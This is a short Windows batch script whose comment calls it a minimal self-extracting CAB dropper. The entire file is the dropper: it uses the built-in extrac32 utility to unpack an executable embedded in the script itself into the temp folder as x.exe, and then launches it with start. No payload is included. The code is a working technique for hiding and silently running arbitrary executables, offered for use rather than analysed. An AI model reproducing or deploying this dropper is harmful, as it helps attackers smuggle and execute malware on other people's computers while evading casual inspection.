@echo off
REM Minimal self-extracting CAB-dropper: the running script is its own
REM archive; extrac32 unpacks the embedded payload and start runs it.
cls && extrac32 /y "%~f0" "%tmp%\x.exe" && start "" "%tmp%\x.exe"
